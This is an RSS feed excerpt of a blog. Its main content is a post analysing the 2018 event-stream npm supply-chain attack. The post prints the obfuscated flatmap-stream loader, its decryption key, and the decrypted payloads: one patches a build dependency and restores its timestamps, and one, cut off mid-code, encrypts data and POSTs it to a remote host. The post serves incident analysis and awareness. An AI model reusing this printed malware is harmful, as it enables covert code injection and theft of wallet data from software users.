<p>This not only applies to single channel DMs, but the Slack API exposes several event subscriptions for message events in specific channels, specific groups, multiparty direct messages, private channels, and even every message sent in a workspace. The app builder simply must turn on these events request the appropriate permissions and the payload will be sent to the designated endpoint.</p>
<p>In short, it requires very little configuration and code to access and expose private Slack messages.</p>
<h2 id="what-can-you-do">What can you do?</h2>
<ol>
<li>
<p>Be extremely mindful of the apps and permissions you give third party apps. Ask yourself basic questions about these permissions. If you are installing a fun GIF app, why dose it requires channel history permissions?</p>
</li>
<li>
<p>Use Slack apps that have been made open source. Don&rsquo;t hesitate to poke around a repository if you are questioning why an app requires certain permissions!</p>
</li>
<li>
<p>Request that any custom apps your Slack workspace uses are made open source.</p>
</li>
</ol>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>To Catch a Hacker - NPM Even Stream</title>
      <link>https://johncodes.com/posts/npm-event-stream/</link>
      <pubDate>Fri, 14 Dec 2018 21:20:46 -0700</pubDate>
      
      <guid>https://johncodes.com/posts/npm-event-stream/</guid>
      <description>(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)
A few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM.</description>
      <content:encoded><![CDATA[<p>(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)</p>
<p>A few weeks ago, <a href="https://github.com/dominictarr/event-stream/issues/116">this</a> issue was opened on a popular Node NPM package called <em>Event Stream</em>. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM. The newly opened issue initially questioned a new, suspicious dependency that was pushed by a new, unknown maintainer. I was lucky enough to follow the community&rsquo;s investigation into this issue and now, I hope to present the findings here. My goal with this piece is to hopefully shed some light on how easy it is for somebody to inject malicious code into NPM packages, the responsibility of open source maintainers, and the responsibility of the community.</p>
<h2 id="the-malicious-code">The Malicious Code</h2>
<p>A Github user noticed that a new dependency named <em>flatmap-stream</em> was added to the event stream module. Through some investigative work, here is the raw code (un-minified by Github user <a href="https://github.com/FallingSnow">FallingSnow</a>) that was injected through flatmap. The flatmap module was an unknown, single author module.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// var r = require, t = process;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// function e(r) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     return Buffer.from(r, &#34;hex&#34;).toString()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// }
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">data</span>, <span style="color:#e6db74">&#34;hex&#34;</span>).<span style="color:#a6e22e">toString</span>()
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// var n = r(e(&#34;2e2f746573742f64617461&#34;)),
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// var n = require(decode(&#34;2e2f746573742f64617461&#34;))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// var n = require(&#39;./test/data&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629&#34;</span>,<span style="color:#e6db74">&#34;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1&#34;</span>,<span style="color:#e6db74">&#34;63727970746f&#34;</span>,<span style="color:#e6db74">&#34;656e76&#34;</span>,<span style="color:#e6db74">&#34;6e706d5f7061636b6167655f6465736372697074696f6e&#34;</span>,<span style="color:#e6db74">&#34;616573323536&#34;</span>,<span style="color:#e6db74">&#34;6372656174654465636970686572&#34;</span>,<span style="color:#e6db74">&#34;5f636f6d70696c65&#34;</span>,<span style="color:#e6db74">&#34;686578&#34;</span>,<span style="color:#e6db74">&#34;75746638&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// o = t[e(n[3])][e(n[4])];
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// npm_package_description = process[decode(n[3])][decode(n[4])];
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// npm_package_description = process[&#39;env&#39;][&#39;npm_package_description&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">npm_package_description</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Get all children of a pid&#39;</span>; <span style="color:#75715e">// Description from ps-tree (this is the aes decryption key)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// if (!o) return;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">npm_package_description</span>) <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">decipher</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>)[<span style="color:#e6db74">&#39;createDecipher&#39;</span>](<span style="color:#e6db74">&#39;aes256&#39;</span>, <span style="color:#a6e22e">npm_package_description</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// a = u.update(n[0], e(n[8]), e(n[9]));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// decoded = decipher.update(n[0], e(n[8]), e(n[9]));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">decoded</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decipher</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">n</span>[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#39;hex&#39;</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// a += u.final(e(n[9]));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">decoded</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">decipher</span>.<span style="color:#66d9ef">final</span>(<span style="color:#e6db74">&#39;utf8&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// var f = new module.constructor;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newModule</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">constructor</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// f.paths = module.paths, f[e(n[7])](a, &#34;&#34;), f.exports(n[1])
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// newModule.paths = module.paths, newModule[&#39;_compile&#39;](decoded, &#34;&#34;), newModule.exports(n[1])
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// newModule.paths = module.paths
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// newModule[&#39;_compile&#39;](decoded, &#34;&#34;) // Module.prototype._compile = function(content, filename)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// newModule.exports(n[1])
</span></span></span></code></pre></div><p>As we can see, this is a fairly messy bit of code (as it had to be converted from mini-js to readable Node code). Also, the reader should note that there are some additional comments provided by FallingSnow, specifically the last bit. Caution! Do not run the last bit of code. You can simply use the above code to decrypt and see the injection attack.</p>
<p>The biggest thing that tips us off to this being malicious is the long stream of encrypted characters that are latter decrypted and used in a <code>exports</code> statement, effectively &ldquo;compiling&rdquo; and running whatever is held in the encrypted block. Further, we can see that the <code>n</code> variable holds an array of 2 separate strings. And finally, in the last block, we can see that the decrypted string from the <code>n</code> variable is used with a &lsquo;_compile&rsquo; statement, effectively running whatever parsed JavaScript might be held within the string.</p>
<h2 id="brute-force-a-solution">Brute Force a Solution</h2>
<p>Now, the key to deciphering the encrypted text depends directly on the <code>npm_package_description</code> variable, as we can see it is being used as the key in the <code>createDecipher</code> method. The initial thought from the community was that this key must be from the event stream <code>package.json</code> file itself (since the node runtime environment would set the modules description). However, this proved to not be the correct key and several Github users noted that it is possible to manually set a modules description from within the code. So, in order to find out what this injection attack is doing, we have to find the matching NPM package description.</p>
<p>Eventually, the community was able to find a listing of all public NPM package descriptions and brute force a solution out of this long list of descriptions. Brute forcing the solution out of public NPM package descriptions was a clever way to eventually land on the right key. Since the variable name is descriptive enough, we can effectively narrow it down from an infinite number of possibilities to only strings that are NPM package descriptions. If the key&rsquo;s variable name hadn&rsquo;t been as pronounced, it would have been more challenge to find the key. The correct key is as follows and comes from the copay-dash NPM module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">npm_package_description</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A Secure Bitcoin Wallet&#39;</span>;
</span></span></code></pre></div><p>Using this as the key, we can see the decrypted code is as follows, in the two seperate payloads:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">/*@@*/</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">/build\:.*\-release/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>[<span style="color:#ae81ff">2</span>])) <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">npm_package_description</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">statSync</span>(<span style="color:#a6e22e">i</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">i</span>, <span style="color:#e6db74">&#34;utf8&#34;</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">o</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>).<span style="color:#a6e22e">createDecipher</span>(<span style="color:#e6db74">&#34;aes256&#34;</span>, <span style="color:#a6e22e">t</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">e</span>, <span style="color:#e6db74">&#34;hex&#34;</span>, <span style="color:#e6db74">&#34;utf8&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">o</span>.<span style="color:#66d9ef">final</span>(<span style="color:#e6db74">&#34;utf8&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;\n/*@@*/&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">a</span>)), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">c</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;utf8&#34;</span>), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">utimesSync</span>(<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">atime</span>, <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">mtime</span>), <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;exit&#34;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">c</span>, <span style="color:#e6db74">&#34;utf8&#34;</span>), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">utimesSync</span>(<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">atime</span>, <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">mtime</span>)
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">/*@@*/</span> <span style="color:#f92672">!</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">e</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;http&#34;</span>),
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>),
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">i</span>(<span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">n</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">e</span>, <span style="color:#e6db74">&#34;hex&#34;</span>).<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">request</span>({
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">hostname</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">e</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8080</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">t</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;Content-Length&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">length</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }, <span style="color:#66d9ef">function</span>() {});
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {}), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">n</span>), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">end</span>()
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">r</span>(<span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">r</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">r</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">200</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">r</span>, <span style="color:#ae81ff">200</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">n</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">publicEncrypt</span>(<span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">o</span>, <span style="color:#e6db74">&#34;utf8&#34;</span>)).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#34;hex&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;+&#34;</span>
</span></span><span style="display:flex;"><span>                }
